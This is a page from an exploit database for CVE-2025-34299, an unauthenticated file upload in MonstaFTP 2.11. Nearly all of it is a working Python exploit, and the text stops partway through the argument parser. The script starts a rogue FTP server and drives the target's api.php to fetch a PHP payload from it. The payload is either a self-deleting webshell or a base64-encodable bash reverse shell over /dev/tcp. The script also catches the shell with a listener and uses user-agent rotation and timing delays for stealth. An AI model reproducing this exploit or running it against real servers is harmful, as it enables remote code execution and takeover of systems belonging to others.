---
title: MonstaFTP Unauthenticated File Upload
url: https://cxsecurity.com/issue/WLB-2025120002
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-12-01
fetch_date: 2025-12-02T03:17:39.354437
---

# MonstaFTP Unauthenticated File Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **MonstaFTP Unauthenticated File Upload** **2025.12.01**  Credit:  **[ibrahimsql](https://cxsecurity.com/author/ibrahimsql/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-34299](https://cxsecurity.com/cveshow/CVE-2025-34299/ "Click to see CVE-2025-34299")**  CWE: **[CWE-434](https://cxsecurity.com/cwe/CWE-434 "Click to see CWE-434")** | |

# Titles: MonstaFTP Unauthenticated File Upload CVE-2025-34299
# Author: ibrahimsql
# Date: 11/21/2025
# Vendor: https://www.monstaftp.com/
# Software: V2.11
# Reference: https://nvd.nist.gov/vuln/detail/CVE-2025-34299
import argparse
import base64
import json
import os
import random
import requests
import socket
import string
import sys
import tempfile
import threading
import time
import urllib3
from pwn import remote
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)
USER\_AGENTS = [
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_15\_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_15\_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15"
]
class ExploitFTPHandler(FTPHandler):
def \_\_init\_\_(self, \*args, \*\*kwargs):
super().\_\_init\_\_(\*args, \*\*kwargs)
self.banner = "FTP Server Ready"
class Listener:
def \_\_init\_\_(self, bind\_host, bind\_port):
self.bind\_host = bind\_host
self.bind\_port = bind\_port
def start\_listener(self):
try:
with socket.create\_server((self.bind\_host, self.bind\_port)) as listener:
print(f"[\*] Listening on {self.bind\_host}:{self.bind\_port}...")
listener.settimeout(1)
while True:
try:
client, addr = listener.accept()
print(f"[+] Received connection from {addr[0]}:{addr[1]}")
client.settimeout(0.1)
self.handle\_client(client)
break
except socket.timeout:
continue
except Exception as e:
print(f"[-] Failed to start listener: {e}")
def handle\_client(self, client):
try:
tube = remote.fromsocket(client)
tube.interactive()
except (KeyboardInterrupt, EOFError):
print("\n[\*] Connection closed")
except Exception as e:
print(f"[-] Error: {e}")
finally:
client.close()
def generate\_payload(lhost, lport, mode, encode=False):
random\_cmd = ''.join(random.choices(string.ascii\_letters, k=6))
if mode == "webshell":
payload = f"<?php if(isset($\_GET['{random\_cmd}'])) {{system($\_GET['{random\_cmd}']);}} unlink(\_\_FILE\_\_); ?>"
else:
shell\_cmd = f"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &'"
if encode:
encoded = base64.b64encode(shell\_cmd.encode()).decode()
payload = f"<?php $f=\_\_FILE\_\_; exec(base64\_decode('{encoded}')); unlink($f); ?>"
else:
payload = f"<?php $f=\_\_FILE\_\_; exec(\"{shell\_cmd}\"); unlink($f); ?>"
return payload, random\_cmd
def start\_ftp\_server(host, port, lhost, lport, mode, encode):
ftp\_dir = tempfile.mkdtemp()
random\_filename = ''.join(random.choices(string.ascii\_letters + string.digits, k=12)) + '.php'
payload\_file = os.path.join(ftp\_dir, random\_filename)
payload, cmd\_param = generate\_payload(lhost, lport, mode, encode)
with open(payload\_file, 'wb') as f:
f.write(payload.encode())
user = ''.join(random.choices(string.ascii\_letters + string.digits, k=8))
pwd = ''.join(random.choices(string.ascii\_letters + string.digits, k=12))
authorizer = DummyAuthorizer()
authorizer.add\_user(user, pwd, ftp\_dir, perm="elradfmw")
ExploitFTPHandler.authorizer = authorizer
server = FTPServer((host, port), ExploitFTPHandler)
server.max\_connections = 256
return server, ftp\_dir, f"/{random\_filename}", user, pwd, cmd\_param
def exploit(target, host, port, lhost, lport, mode, stealth, encode):
listener\_thread = None
if mode == "reverse":
listener = Listener(lhost, lport)
listener\_thread = threading.Thread(target=listener.start\_listener, daemon=False)
listener\_thread.start()
time.sleep(1)
server, ftp\_dir, remote, user, pwd, cmd\_param = start\_ftp\_server(host, port, lhost, lport, mode, encode)
threading.Thread(target=server.serve\_forever, daemon=True).start()
time.sleep(1)
local = ''.join(random.choices(string.ascii\_letters + string.digits, k=8)) + '.php'
api\_url = f"{target.rstrip('/')}/application/api/api.php"
request\_data = {
"connectionType": "ftp",
"configuration": {
"host": host,
"username": user,
"initialDirectory": "/",
"password": pwd,
"port": port
},
"actionName": "downloadFile",
"context": {
"remotePath": remote,
"localPath": local
}
}
headers = {
"Content-Type": "application/x-www-form-urlencoded",
"User-Agent": random.choice(USER\_AGENTS) if stealth else "python-requests"
}
if stealth:
time.sleep(random.uniform(0.5, 2.0))
try:
response = requests.post(
api\_url,
data={"request": json.dumps(request\_data)},
headers=headers,
timeout=30,
verify=False
)
try:
response\_data = response.json()
except (json.JSONDecodeError, ValueError):
print(f"[-] Invalid JSON response: {response.text[:200]}")
return False
if response.status\_code == 200 and response\_data.get("success"):
payload\_url = f"{target.rstrip('/')}/application/api/{local}"
print(f"[+] Payload uploaded: {payload\_url}")
if mode == "webshell":
print(f"[+] Web shell active!")
print(f"[\*] Usage: {payload\_url}?{cmd\_param}=<command>")
print(f"[\*] Example: {payload\_url}?{cmd\_param}=id")
return True
else:
print(f"[\*] Triggering reverse shell...")
try:
requests.get(payload\_url, timeout=5, verify=False, headers=headers)
except:
pass
if listener\_thread:
listener\_thread.join()
return True
print(f"[-] Failed: {response.text}")
return False
except Exception as e:
print(f"[-] Error: {e}")
return False
def main():
parser = argparse.ArgumentParser(description="Monsta FTP CVE-2025-34299 Exploit")
parser.add\_argument("target", help="Target URL")
parser.a...